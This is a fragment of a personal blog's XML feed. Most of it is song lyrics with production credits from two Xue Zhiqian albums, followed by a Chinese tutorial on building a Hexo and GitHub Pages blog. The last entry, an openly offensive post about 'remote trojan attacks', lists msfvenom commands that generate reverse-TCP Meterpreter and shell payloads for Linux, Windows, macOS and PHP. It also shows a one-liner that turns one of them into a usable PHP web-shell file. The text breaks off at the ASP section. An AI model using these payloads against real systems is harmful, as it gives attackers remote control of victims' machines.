      <link href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;</p><h5 id="《渡》专辑"><font face="楷体">《渡》专辑</font><a href="post/薛之谦-《渡》专辑#《渡》专辑"></a></h5><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=1&id=36855053&auto=0&height=430"></iframe><p>&nbsp;</p><h6 id="《动物世界》"><center><font face="楷体">《动物世界》</font></center><a href="post/薛之谦-《渡》专辑#《动物世界》"></a></h6><center><font face="楷体">作曲 : 郭顶作词 : 薛之谦东打一下西戳一下动物未必需要尖牙示爱的方法有礼貌或是我管它要将情人一口吞下还要显得温文尔雅螳螂委屈的展示旧伤疤求偶时候一惊一乍因为害怕时常倒挂走投无路的情况下舍弃了尾巴如果不能将它同化就寄生于它 大不了一同腐化努力进化 笑动物世界都太假祖先 已磨去爪牙相爱相杀 一定有更好的办法攀比一下 谁先跪下不再进化 动物世界里都太傻为情表现到浮夸得到了你就该丢下 人性来不及粉刷所以啊 人总患孤寡麋鹿本来约在树下说好一起浪迹天涯系上铃铛还在往那个方向挣扎如果有只豺狼它英勇披上婚纱 同伴笑他读过童话别再进化 别让动物世界太假我们 该露出爪牙相爱相杀 别再想更好的办法优胜劣汰 自舔伤疤假装进化 拼命想和动物有差玩一出高贵优雅在人们腐烂的欲望下 兽性来不及抹杀算了吧 懒得去挣扎人类用沙 想捏出梦里通天塔为贪念不惜代价驾驭着昂贵的木马 巢穴一层层叠加最后啊 却一丝不挂 别害怕 我们都孤寡制作人：郭顶编曲/钢琴/贝斯：陈迪鼓：王斌弦乐：国际首席爱乐乐团第一小提琴：李朋 王大毛庞阔 张浩 杨爽 李曦 刘潇 高言 杨思宇 倪冰雪第二小提琴：简蓓 阎红 张晨迪 唐昕 侯宇红 张雷 徐文超中提琴：何辉 毕芳 武文豪 陈欣欣 王羽沛大提琴：张平 郎莹 陈俊杰 孙艺 邵鑫低音提琴：周旭 段然录音：汝文博 （Big J Studio. beijing.)混音：赵靖（Big J Studio. beijing.）母带：Tom Coyne （Sterlingsound NYC.）</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《暧昧》"><a href="#《暧昧》" class="headerlink" title="《暧昧》"></a><center><font face="楷体">《暧昧》</font></center></h6><center><font face="楷体">作曲 : 薛之谦作词 : 薛之谦反正现在的感情 都暧昧你大可不必为难 找般配付出过的人排队 谈体会趁年轻别害怕一个人睡可能是现在感情 太昂贵让付出真心的人 好狼狈还不如听首情歌 的机会 忘了谁感情像牛奶一杯 越甜越让人生畏都早有些防备 润色前的原味所以人们都拿起咖啡 把试探放在两人位距离感一对 就不必再赤裸相对反正现在的感情 都暧昧你大可不必为难 找般配付出过的人排队 谈体会弃之可惜 食而无味可能是现在感情 太珍贵让付出真心的人 好疲惫谁不曾用过卑微的词汇 想留住谁还贪恋着衣衫昂贵 却输给了廉价香水他先诱你入位 还刻意放低了分贝可感情越爱越妩媚 像烂掉的苹果一堆连基因都不对 还在意什么鱼腥味反正现在的感情 都暧昧你大可不必为难 找般配何必给自己沉迷 的机会不如用误会来结尾反正现在的我们 算暧昧我愿意给的感情 请浪费反正流过的眼泪 难收回就别再安慰看你入眠的侧脸 有多美和你丢下的一切 好匹配我还以为我能 多狼狈我自以为制作人：郑伟编曲：薛之谦 郑伟混音：郑伟大提琴：周润青女声：孟楠合音：薛之谦 张石狄录音：莫家伟母带：Chris Gehringer</font>&nbsp;&nbsp;&nbsp;###### <center><font face="楷体">《像风一样》</font><center><font face="楷体">作词：薛之谦作曲：薛之谦我等的模样好不具象用皮肤感受你的流向你竟然能做到带走阳光我一味的跟随过了量像风一样你靠近云都下降你卷起千层海浪我躲也不躲往里闯你不就像风一样侵略时沙沙作响再宣布恢复晴朗就好像我们两个没爱过一样曲折的夕阳负责格挡让委屈的感官无法释放最近我的伤口没生长因为我躲在没风的地方像风一样你靠近云都下降你卷起千层海浪我躲也不躲往里闯你不就像风一样侵略时沙沙作响再宣布恢复晴朗就好像我们两个没爱过一样你像风一样触摸时温柔流淌席卷我所有抵抗不急着要我投降你不就像风一样掠夺时沙沙作响可惜我自投罗网你也就没什么可骄傲的地方和风一样你离开不声不响我喜欢这种收场看上去谁也不曾亏欠过对方制作人：薛之谦编曲：张宝宇 郑伟混音：郑伟合音：薛之谦鼓：褚伟明bass：宣一亨吉他：孙闻楠人声录制：莫家伟（上海广播大厦200studio）乐器录制：吴身宝（soundhub studio）母带制作：Ted Jensen</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《高尚》"><a href="#《高尚》" class="headerlink" title="《高尚》"></a><center><font face="楷体">《高尚》</font></center></h6><center><font face="楷体">作曲 : 周以力作词 : 薛之谦Vocal录音室：江苏广电总台录音室乐器录音室：北京录顶技录音室乐器录音师：王晓海；鲍锐（鼓）混音工程师：鲍锐@录顶技Studio母带工程师：Friedemann Tishmeyer@Hambug Studio在阴郁的地方 积攒能量人交出了什么 能变个样奇形怪状 的人在生长我躲在人群中 头在晃刺破我的心脏 样本不算肮脏 别恐慌你看我虚荣模样 你该怎么补偿我多高尚 向自尊开了枪你同情的眼光 我特别的欣赏哀而不伤我多慌张 怕人闯入我围墙窥探五官不详 见我原本模样还能 模仿 任何形状越恶劣的情况 越要想象狼藏起反犬旁 像从了良张牙舞爪 的人在散谎愿形容我的词 别太荒唐贪念表现恰当 就像索要嫁妆 在情理上请当我孤芳自赏 还规矩条条框框我多高尚 向自尊开了枪​你异样的眼光 我特别的欣赏让人难忘我多风光 你别闯入我围墙你要什么真相 不就图个皮囊不如 让我 留在橱窗我多难忘 像秀色可餐的模样感谢你又打赏 你用词越恰当我越膨胀我的疯狂 连我自己都看不上阴里怪气的愿望 那屈辱的轻伤谁能给我 发个奖章我多向往 有个美丽的地方我最初的模样 没痛也不会痒能把赏赐 都烧光编曲：周以力大提琴：郎莹鼓：尹森贝斯：陈然然吉他：张凇</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《骆驼》"><a href="#《骆驼》" class="headerlink" title="《骆驼》"></a><center><font face="楷体">《骆驼》</font></center></h6><center><font face="楷体">作曲 : 郭顶作词 : 甘世佳是什么在召唤着我提醒我我懦弱过犹豫过若我能挣脱那绳索旁若无人见我来议论我我是骆驼没见过最美的沙漠井里的青蛙劝我别相信候鸟胡说我心里有片沙漠那里有很多骆驼不再寂寞会围绕着我陪我说说我心里有片沙漠点缀着森林湖泊雨季一过有我爱吃的小水果我终于挣脱了绳索从不曾这么自在过轻松过我决定找回骆驼的生活不要再跟着我再骑着我沿途云朵趁没人看见就降落提醒着我再往前就从没人出去过转眼就看见沙漠那里有没有骆驼在期待我它是否在哪偷偷看我明明就来到沙漠为何看不到骆驼是不是说我来的不是时候原来这就是沙漠本来就没有骆驼负责地说那什么是我什么是我全世界都是沙漠人心里住着骆驼你就当做 我根本没有来过 来过都怪我亲手杀了骆驼制作人：郭顶编曲：陈迪吉他：陈迪 郭顶贝斯：陈迪鼓：Hayato录音：汝文博 At Big J Studio混音：卢楠 At Megawave Studio BJ母带：Ryan Smith At Sterling Sound NYC</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《别》"><a href="#《别》" class="headerlink" title="《别》"></a><center><font face="楷体">《别》</font></center></h6><center><font face="楷体">作曲 : 薛之谦作词 : 薛之谦别犹豫 别偶遇 别相遇别一个人去看喜剧别继续 别比喻 别治愈别让人看出你有多委屈别下雨 别下去 别多余别以为他还会为你淋雨别几句 就离去 别离去别让他听见你最后一句别坦白 别让故事精彩别不安 只是还有习惯别喜欢 我长期的勇敢别揭穿 我唯一的遗憾别允许 别也许 别参与别自己和自己过不去别一句 又一句 别造句别让人笑话你的遭遇别坦白 别让故事精彩别不安 只是还有习惯别喜欢 我长期的勇敢别揭穿 我唯一的遗憾别垄断 我想你的夜晚别刺穿 我包裹的不堪别交代 我爱你的病态多草率 除了你都不爱别犹豫 别偶遇 别相遇....制作人：郑伟编曲：郑伟混音：郑伟合音：薛之谦弦乐：上海piao音弦乐团人声录制：吴身宝（soundhub studio）弦乐录制：莫家伟（上海广播大厦200studio）母带：Chris Gehringer</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《火星人来过》"><a href="#《火星人来过》" class="headerlink" title="《火星人来过》"></a><center><font face="楷体">《火星人来过》</font></center></h6><center><font face="楷体">作曲 : 韩星洲作词 : 薛之谦我在听新闻里面说 他们曾来过火星人的心脏靠左我们也曾听大人说 他没有管我他们一定看见什么过森林不在 动物减半人们拍照 留念那些 飞机残骸妻离子散 空袭灾难那些不敢 谈政治的 都去避难被遗弃的小孩 搀扶那颗炸弹他父母被人用枪指着头要答案若要停战 先要谈判这一片片 荒凉土地幕后到底谁管如果钢铁都燃起火看城市多折磨请你配合我 一起难过假如猿人没点起火我们回到那生活你是否救得回刚离群的我火星人来过火星人来过火星人救我火星人救我火星人救我火星人爱我其实我们也忏悔过借口都好说可以怪我心脏偏左有些领袖话音刚落也会很难过因为会议迟迟通不过舍利不在象牙贩卖人们认为贫穷可以卖掉小孩钻石太窄富人不爱还在楼顶挥霍那些仿真钱财反正这没战乱也没有什么天灾我管他谁让瘟疫艾滋继续泛滥这种心态还能表态毕竟这是个打字不用负责任的年代如果欲望都燃起火怎么自私怎么活请你举起手假装难过假如猿人没点起火我们回到那生活你是否劝得住开第一枪的我假如有第三次战火让地核接近我你别难过请抱紧我如果你不能说服我就请你瞄准我你听地球刚哭过地球刚哭过地球有话说地球好脆弱火星人救我火星人救我火星人来过...制作人 : 韩星洲编曲 : 韩星洲混音 : 赵靖</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《背过手》"><a href="#《背过手》" class="headerlink" title="《背过手》"></a><center><font face="楷体">《背过手》</font></center></h6><center><font face="楷体">作曲 : 薛之谦作词 : 薛之谦花被人摘走心被虫吸走我一无所有错过盛开的时候皮被刀割走枝被鹿捡走树从不开口破土后哪来的自由无奈的请背过手 在缝里等野果成熟无辜的人松了手 反正那背负都雷同梦被人抢走字被人偷走别攥着拳头最多解开粒领扣风劝云别走海将河推走爱上就别低头骄傲的自作自受无奈的请背过手 在梦里等斑驳轻舟无辜的人松了手 反正那背负都雷同无奈了请放下手 等野草会出卖墙头无耻的人伸出手 跪多久能换来富有生劝死别走 魂被肉死守尽量别张口 满足狼的胃口等怂恿的烫了手等看懂的还我自由制作人：郑伟编曲：宋涛混音：赵靖 Big J Studio女声：莫宇微合音：薛之谦吉他：宋涛贝斯：韩阳鼓：武勇恒（贝贝）人声录制：莫家伟（上海广播大厦200studio）女声、合音录制：汝文博 Bjg J Studio吉他、贝斯录制：汝文博 Big J Studio鼓录制：李游 55Tec Studio母带制作：Chris Gehringer</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《渡》"><a href="#《渡》" class="headerlink" title="《渡》"></a><center><font face="楷体">《渡》</font></center></h6><center><font face="楷体">中文词：薛之谦原词曲：Torbjorn Brundtland，Svein Berge渡人去的夜 用稀有的火焰照亮了胆怯 燃尽我语言亏欠都是磁铁 也不能被降解都想赎去罪孽 再偷偷的怀念有人在妥协 有人拼命在狡辩人设太可怜 希望你谅解都在散播细节 肢体在蔓延都想要张新脸 骨肉别相连渡人去的夜 船离开了湖面过程很简洁 根本没人能幸免你会坠入深渊 还是不断盘旋别被渡人听见 你还有所留恋制作人：郑伟编曲：Torbjorn Brundtland， Svein Berge混音：郑伟合音：薛之谦人声录制：莫家伟（上海广播大厦200studio），吴身宝（soundhub studio）母带制作：Chris Gehringer</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h6 id="《我害怕》"><a href="#《我害怕》" class="headerlink" title="《我害怕》"></a><center><font face="楷体">《我害怕》</font></center></h6><center><font face="楷体">作词：薛之谦作曲：薛之谦我害怕你的消息不经意被谁提起像曾贴着我耳边的气息我害怕某个旋律带我回某个场景你说如果雨停了我们就在一起我害怕某条街道有你留下的记号会自以为是你对我的需要</font><center><font face="楷体">我害怕那段旅行继续在我的梦里我还相信你说的离开的原因最近我表现的还可以最近你已走到了哪里别在意随便问问而已都怪我才学会了爱情</font><center><font face="楷体">我害怕整理行李我害怕关灯休息我害怕揉揉眼睛就错过了你我害怕人潮密集我害怕山川小溪我害怕我在附近却找不到你如果我掉入了海底是否你会有一丝感应别在意随便说说而已别有压力我只想见见你</font><center><font face="楷体">我害怕你的呼吸我害怕太近距离我害怕别人提到你的秘密</font><center><font face="楷体">编曲：张宝宇混音：郑伟合音：薛之谦吉他手：宋宇母带：郑伟录音：莫家伟录音棚：上海广播大厦200studio</font><p>&nbsp;<br>&nbsp;<br>&nbsp;</p></center></center></center></center></center></center></center></center></center></center></center></center></center></center></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>薛之谦-《最好》专辑</title>
      <link href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%9C%80%E5%A5%BD%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%9C%80%E5%A5%BD%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=2&id=1294910785&auto=0&height=66"></iframe><center><font face="楷体">作曲 : 林倛玉/郭顶作词 : 小寒/廖慧明/郭顶最好就这样能把你忘掉最好能不想还有多困扰这复杂的情绪向我奔跑由来已经太少 或者已经无药</font><center><font face="楷体">最好的都已经送你不要最好的朋友说我太无聊最好的方式也只能这样反正你不要了 都好说不清他比我适合 适合这种时刻</font><center><font face="楷体">还是他比我懂得更让你快乐也许没资格 也只能怀念了我懂 没有意外了或许他比较适合 适合这种值得他说他比我懂得更让你快乐最好 不要记得我</font><center><font face="楷体">最好的都已经送你不要最好的朋友说我太无聊最好的方式也只能这样反正你不要了 都好</font><center><font face="楷体">说不清他比我适合 适合这种时刻还是他比我懂得更让你快乐也许没资格 也只能怀念了我懂 没有意外了</font><center><font face="楷体">或许他比较适合 适合这种值得他说他比我懂得更让你快乐最好 不要记得最好 不要记得最好 不要记得我</font><center><font face="楷体">制作人：郭顶编曲：陈迪钢琴/贝斯/吉他：陈迪弦乐录音：国际首席爱乐乐团/Memory Time Studio,beijing鼓 : 钟健鼓录音: 于昊/Tweak Tone Labs（beijing）录音 : 刘灵/Big.J Studio, Beijing音频编辑 : 赵靖/郭顶混音: 赵靖/Big.J Studio, BeijingOC/OA ：小寒*&廖慧明*&郭顶(OA)/林倛玉*&郭顶(OC)OP：Funkie Monkies Publishing Pte Ltd (Warner/Chappell Music Taiwan Ltd.)OP：北京享耳音乐文化有限公司SP：Warner/Chappell Music Publishing Agency (Beijing) Ltd.SP：北京享耳音乐文化有限公司母带工程师: 姜升熙 Seunghee Kang@SONIC KOREA MASTERING</font>&nbsp;&nbsp;&nbsp;&nbsp;</center></center></center></center></center></center></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Github博客搭建终极大法</title>
      <link href="/post/createGithubblog/"/>
      <url>/post/createGithubblog/</url>
      
        <content type="html"><![CDATA[<p>2019.2.26更新<br>最近有同学、朋友问我详细的Hexo+Github Pages Blog搭建，加之我把我这几个月来的一些使用技巧和方法总结一下。为什么要今天来更新一下呢？<br>因为26对我来说是个特别的日子…..</p><a id="more"></a><p><font face="楷体">边听边看吧😊</font></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=32705017&auto=0&height=66"></iframe><p><font face="宋体"></font></p><h3 id="一、-前言"><font color="#FF6347" face="Comic sans MS">一、 前言</font><a href="post/createGithubblog#一、-前言"></a></h3><p><font face="宋体">&emsp;很早之前就想到要拥有自己的一个个人博客，最初想到的是CSDN，除了会员，无奈广告太多。接着考虑过博客园，但是不太喜欢它的UI……最终经朋友推荐了Github博客。经过大致几个小时的Search关于Github博客有关的东西之后，发现里面的背景、字体、高亮代码等等的所有东西全部都可以DIY，对于一个喜欢美丽事物的我来说确实喜欢上了。好了，话不多说了，接下来谈谈建立这个博客的辛酸过程吧……<br></font></p><blockquote><p>要有一个良好的使用习惯，包括但不限于：</p><ol><li>写自己博客创建方法。博客搭建好后可以写写自己搭建过程中遇到的问题以及解决方法；</li><li>解决报错信息。初次搭建博客的过程是很麻烦的，特别对于git的报错，或者是hexo安装过程遇到的一系列问题，我的建议是：将报错信息复制到Google或者百度找解决方法，或者将错误截图和原因告诉已经搭建好博客的人，请教他们是如何解决类似问题的；</li><li>创建更新日志。为自己的博客写一个更新日志，内容可以包含：更新内容、时间、原因、目的、方法，以及更新过程中遇到的问题是怎样解决的，这个习惯非常好，以后能非常便捷地帮助自己了解到博客的变化，以及自身积累的一个过程；</li><li>初始创建好博客文件夹后可以复制一份保留好，以便后续可能使用到(极大可能会使用)；</li><li>站点目录下的_config文件可以多复制几份，但是要方便区分；<br>……</li></ol></blockquote><p>&emsp;<br>最近我重新又搭建了一个博客，实现了一台电脑搭建多个博客并部署到远程Github仓库。<br>但是这个过程也是非常痛苦的，因为网上的教程我几乎都试了，但是没有一个是成功的……下面我会分别谈谈搭建一个、多个博客的详细过程。<br>前提是第一个博客博客要搭建好，其余的就非常简单了！ (。・∀・)ノ</p><p>&emsp;</p><h3 id="二、-搭建第一个博客"><font color="#FF6347" face="Comic sans MS">二、 搭建第一个博客</font><a href="post/createGithubblog#二、-搭建第一个博客"></a></h3><h4 id="2-1-搭建方式"><font color="#3CB371" face="Comic sans MS">2.1 搭建方式</font><a href="post/createGithubblog#2-1-搭建方式"></a></h4><blockquote><p>Hexo+Github、Jekyll+Github</p></blockquote><p><font face="宋体">&emsp;至于使用哪一种方式，网上看了许多帖子、视频、博客……大部分是使用Hexo，后来自己网上找了许多原因，发现Hexo官网提供了非常丰富的主题和插件，加上好维护，最终我选择了Hexo来搭建。</font></p><h4 id="2-2-搭建需要的工具"><font color="#3CB371" face="Comic sans MS">2.2 搭建需要的工具</font><a href="post/createGithubblog#2-2-搭建需要的工具"></a></h4><blockquote><p><font face="Arail">1. 安装node.js </font><br><font face="Arail">2. 安装Git </font><br><font face="Arail"> 3. 安装Hexo</font><br><font face="Arail"> 4. 安装Hexo依赖</font><br><font face="Arail"> 5. 安装代码编辑工具，推荐Sublime Text(官网下载)</font></p></blockquote><h4 id="2-3-搭建过程"><font color="#3CB371" face="Comic sans MS">2.3 搭建过程</font><a href="post/createGithubblog#2-3-搭建过程"></a></h4><h5 id="步骤一、那就是先注册自己的Github账号了"><font color="#2196f3" face="Comic sans MS">步骤一、那就是先注册自己的Github账号了</font><a href="post/createGithubblog#步骤一、那就是先注册自己的Github账号了"></a></h5><p>先看完下面文字再点击视频链接去注册。</p><blockquote><p>1.进入<a href="https://github.com/点击注册。注意事项：" target="_blank" rel="noopener">https://github.com/点击注册。注意事项：</a><br>    1）一个用户名、邮箱只能注册一次；<br>    2）Github会限制浏览器，推荐Chrome、Firefox；<br>    3）邮箱验证，通过了才能继续下面事项。</p></blockquote><blockquote><p>2.关于取名：<br>    1）比如我的用户名是Treecatee,相应的仓库取名推荐为Treecatee.github.io，否则后续使用Treecatee.github.io在浏览器访问时报错404；那如果我非要取其他名可以么？可以的，比如我取名为Directoree.github.io，那么在浏览器输入应该为Treecatee/Directoree.github.io，这样就可以了，不过URL很长…..<br>    2）GitHub Pages 建好后需要将Branch改为master，然后在下面接着选一个theme，不然会访问不了Treecatee.github.io</p></blockquote><p><font face="宋体">&emsp;到<a href="https://github.com/" target="_blank" rel="noopener">Github官网</a>注册账号，过程还是有些繁琐的，那就推荐到这个视频看看怎么注册吧…..<br><a href="https://www.bilibili.com/video/av24897960?p=2" target="_blank" rel="noopener">Github注册账号视频（点我）</a>。 </font></p><h5 id="步骤二、-安装node-js"><font color="#2196f3" face="Comic sans MS">步骤二、 安装node.js</font><a href="post/createGithubblog#步骤二、-安装node-js"></a></h5><p><font face="宋体">&emsp;<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">官网下载</a>node，或者使用<a href="https://npm.taobao.org" target="_blank" rel="noopener">淘宝镜像源下载</a>。安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入node -v，如果显示版本则安装成功，否则重新安装。  </font></p><h5 id="步骤三、-安装Git（第一坑）"><font color="#2196f3" face="Comic sans MS">步骤三、 安装Git（第一坑）</font><a href="post/createGithubblog#步骤三、-安装Git（第一坑）"></a></h5><p><font face="宋体">&emsp;1.网上的教程都是直接到<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git官网</a>直接下载，后来到了官网后发现官网根本就不能下载了，这不是坑人么？后来找了很多方法，发现官网已经停止维护更新了，那就得使用其他途径了。推荐<a href="https://npm.taobao.org/mirrors/git-for-windows/" target="_blank" rel="noopener">淘宝镜像</a>，或者到CSDN搜索一下复制链接给淘宝客服帮助你下载（土豪行为）🤭<br>&emsp;2.安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入git，如果显示有相应信息则安装成功，否则重新安装。<br></font></p><h5 id="步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库"><font color="#2196f3" face="Comic sans MS">步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库</font><a href="post/createGithubblog#步骤四、-使用Git创建SSH-RSA密钥复制到自己的Github仓库"></a></h5><p><font face="宋体">&emsp;注意事项：生成密钥的过程会提示是否需要输入密码？按回车默认不需要就可以了，后面一个提示是生成的密钥的文件保存路径，你可以更改也可以不改。创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=4" target="_blank" rel="noopener">点我看视频</a>。</font></p><h5 id="步骤五、-非常重要的一步，创建Hexo（第二坑）"><font color="#2196f3" face="Comic sans MS">步骤五、 非常重要的一步，创建Hexo（第二坑）</font><a href="post/createGithubblog#步骤五、-非常重要的一步，创建Hexo（第二坑）"></a></h5><blockquote><ol><li>建立一个Blog文件夹；</li><li>在Blog文件夹下右键选中Git Bash Here打开Git,输入更换安装源的路径命令<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>，然后输入<code>npm install hexo-cli -g</code>-g是安装到全局；</li><li>安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，这一步创建博客本地站点文件；Directoree文件夹被创建好后，将其复制一份到其他路径下，方便以后用；</li><li>到Blog/Directoree右键选中Git Bash Here打开Git,输入<code>npm install</code>安装依赖。</li></ol></blockquote><p><font face="宋体">&emsp;注意事项：Hexo创建不成功的话是无法搭建博客的，注意创建在目录的位置哦！创建方法参见：<a href="https://www.bilibili.com/video/av24897960?p=5" target="_blank" rel="noopener">点我看视频</a>后发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，代码参考<a href="https://www.cnblogs.com/qq597585136/p/6964599.html" target="_blank" rel="noopener">关于HEXO安装失败的解决方法</a>，如果连接不能跳转则使用下面代码即可：</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g cnpm --registry<span class="token operator">=</span>https://registry.npm.taobao.orgcnpm <span class="token function">install</span> hexo-cli -g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;<br><font face="宋体">&emsp;注意事项：Hexo依赖不成功安装的话是无法搭建博客的，注意创建在目录的位置哦！！！发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，使用下面代码即可：</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><font face="宋体">&emsp;安装好了后就赶紧试试自己的第一篇博客文章吧，在命令行输入：hexo g -s 本地查看一下，参见<a href="https://www.bilibili.com/video/av24897960?p=5" target="_blank" rel="noopener">视频</a>。<br></font></p><h5 id="步骤六、-下载安装Sublime-Text软件"><font color="#2196f3" face="Comic sans MS">步骤六、 下载安装Sublime Text软件</font><a href="post/createGithubblog#步骤六、-下载安装Sublime-Text软件"></a></h5><p><font face="宋体">&emsp;该软件用于编辑代码等，当然也可以使用其他软件，推荐<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">下载地址</a>，点击DOWNLOAD FOR WINDOWS。然后就可以编辑提交文章到自己的博客了啊。如果<code>hexo g</code>时报错远程端连接不上的话，是因为网络问题，多试几次就好了。<br>常用的提交命令：</font></p><pre><code>hexo clhexo ghexo s   （这个是本地查看）hexo d   （这个是部署到自己的博客）</code></pre><p>  哈哈哈，就这样自己的博客初步搭建好了</p><p><font face="楷体">  至于主题替换以及里面插件的使用后续再更吧……😊</font></p><p>&emsp;<br>&emsp;</p><h3 id="三、-搭建第二个博客"><font color="#FF6347" face="Comic sans MS">三、 搭建第二个博客</font><a href="post/createGithubblog#三、-搭建第二个博客"></a></h3><p><font color="#FF7F00"><strong>创建多个博客其实按照逻辑来并不难，难点是在于远程部署文章的时候的解决方法。其实实际也就是使用本地RSA密钥要使用正确。</strong></font></p><blockquote><ol><li>注册GitHub账号；并注意这个时候的SSH-RSA密钥创建的时候我们可以另选一个路径先暂时保存一下，比如桌面；</li><li>Git、node.js不需要再次安装；</li><li>可以将上述复制的博客文件直接拿来用。<br> 1）如果没有复制。则需要检查Hexo是否在新的博客路径下可用，不可用的话重新在新的路径下安装，安装方法参照上面，安装好Hexo后，接着输入<code>hexo init Directoree</code>“Directoree”是博客名，接着安装依赖；<br> 2）如果复制了。需要再安装一个Hexo依赖，否则你会发现<code>hexo cl</code>等命令不能用。</li></ol></blockquote><p>&emsp;<br>&emsp;<br><strong>如果不解决RSA的问题报错如下：</strong></p><div class="article-img"><p><img src="https://i.loli.net/2019/02/26/5c74efb9ac932.png" alt="VF.png" data-zoomable></p></div><p>&emsp;<br>&emsp;<br><strong>解决方法：</strong><font color="red"><strong>部署哪一个博客就使用该博客对应的RSA密钥对！！！</strong></font><br>网上那些方法我都试了但是没有一个能解决实际情况，所以下面的解决方法绝对适用于每一个人！！！</p><p>&emsp;<br>保存RSA密钥的默认路径是<code>C:\Users\Alvin\.ssh</code>，可以看到里面的id_rsa、id_rsa.pub密钥对是第一个博客的，当我们需要部署第二个博客到远程仓库时就需要使用到第二个博客的密钥对，这个时候我们可以在<code>C:\Users\Alvin\.ssh</code>目录下建立一个文件夹，例如建立<code>用于更换</code>文件夹，将暂时不用的密钥对移动到里面，将需要使用到的密钥对放到<code>C:\Users\Alvin\.ssh</code>目录下即可。<br>&emsp;</p><blockquote><p>为什么要这样？<br>那是因为密钥对可以选择使用，但是部署到远程仓库是使用的密钥对文件名字必须为<code>id_rsa、id_rsa.pub</code></p></blockquote><br><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c76836c999aa.png" alt="B.png" data-zoomable></p></div><p>更换后第二个博客部署成功了，如下：<br><img src="https://i.loli.net/2019/02/26/5c74f1f7aad0c.png" alt="O.png"></p><p>&emsp;<br>哈哈哈哈(。・∀・)ノ</p>]]></content>
      
      
      <categories>
          
          <category> Hexo-Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom生成各类Payload命令，远程木马攻击</title>
      <link href="/post/Metasploit1/"/>
      <url>/post/Metasploit1/</url>
      
        <content type="html"><![CDATA[<h4 id="msfvenom生成各类Payload命令"><font face="Arial">   msfvenom生成各类Payload命令</font><a href="post/Metasploit1#msfvenom生成各类Payload命令"></a></h4><blockquote><p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p></blockquote><h5 id="Linux">Linux<a href="post/Metasploit1#Linux"></a></h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f elf &gt; shell.elf</your></your></font></p><h5 id="Windows">Windows<a href="post/Metasploit1#Windows"></a></h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f exe &gt; shell.exe</your></your></font></p><h5 id="Mac">Mac<a href="post/Metasploit1#Mac"></a></h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f macho &gt; shell.macho</your></your></font></p><h5 id="PHP">PHP<a href="post/Metasploit1#PHP"></a></h5><p><font face="Arial">msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.php</your></your></font></p><p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p><h5 id="ASP">ASP<a 